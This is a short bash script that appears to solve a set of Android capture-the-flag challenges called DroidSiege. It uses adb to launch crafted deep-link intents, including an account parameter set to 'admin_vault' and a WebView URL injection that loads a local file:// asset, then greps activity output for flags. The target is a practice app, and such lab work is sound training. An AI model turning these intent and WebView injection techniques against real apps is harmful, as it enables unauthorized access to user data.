#!/usr/bin/env bash
# DroidSiege — components/deeplink tooling pack
set -euo pipefail

echo "== L1: recovery deep link =="
adb shell am start -a android.intent.action.VIEW -d 'siege://recover'
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_deeplink_L1" || true

echo
echo "== L2: account parameter =="
adb shell am start -a android.intent.action.VIEW -d 'siege://recover?account=admin_vault'
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_deeplink_L2" || true

echo
echo "== L3: unverified app-link host =="
adb shell am start -a android.intent.action.VIEW -d 'https://offers.siegeapp.dev/redeem'
sleep 1
adb shell "dumpsys activity top | grep -m1 'DS{components_deeplink_L3" || true

echo
echo "== L4: WebView URL injection (file:// into the reader) =="
adb shell am start -a android.intent.action.VIEW \
  -d 'offers://load?url=file:///android_asset/droidsiege_secret.html'
echo "the WebView renders the bundled asset page — flag on screen"
